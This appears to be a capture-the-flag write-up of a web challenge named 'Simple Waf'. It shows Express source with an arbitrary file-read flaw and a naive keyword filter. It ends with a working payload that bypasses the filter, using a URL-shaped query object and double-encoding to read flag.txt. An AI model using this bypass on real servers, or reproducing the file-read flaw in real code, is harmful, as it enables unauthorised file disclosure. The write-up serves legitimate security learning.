# Simple Waf

![picture 1](../images/6ba4f24d8be0c31c4ce62c522ba2c4f6a5097f645d0f197fd9f378e29605009a.png)  


We follow the provided link to the next page.

![picture 2](../images/850b8d7dadc40a10852cdd31bc36b1af40220dc19abf7e779db15cb1307883b2.png)  

We can see in the URL that we can access files. 

![picture 3](../images/3341412917a0fcb6d9fc42606c568284482e942f73588375a46b23b6e02e28b4.png)  

We can access main.js to get info about the webpage.

```js
const express = require("express");

const fs = require("fs");

const app = express();

const PORT = process.env.PORT || 3456;

app.use((req, res, next) => {
    if([req.body, req.headers, req.query].some(
        (item) => item && JSON.stringify(item).includes("flag")
    )) {
        return res.send("bad hacker!");
    }
    next();
});

app.get("/", (req, res) => {
    try {
        res.setHeader("Content-Type", "text/html");
        res.send(fs.readFileSync(req.query.file || "index.html").toString());       
    }
    catch(err) {
        console.log(err);
        res.status(500).send("Internal server error");
    }
});

app.listen(PORT, () => console.log(`web/simplewaf listening on port ${PORT}`));
```

There is a validation that checks if the flag is present in the request. If it is, it returns a "bad hacker" response. The flag is probably at flag.txt (or another extension).

As the code says, if we request the flag, we get the response mensioned above.

![picture 4](../images/6ab923498a914dcb00c3992ad0707c03150b55d9f9d6a3febd0f8b7fa2e0b872.png)  

So... what If I encode the "flag" in the request?

- Solution

```
https://web-simplewaf-648d0d347a3ce6fa.be.ax/?file[href]=x&file[origin]=x&file[protocol]=file:&file[hostname]=&file[pathname]=fl%2561g.txt
```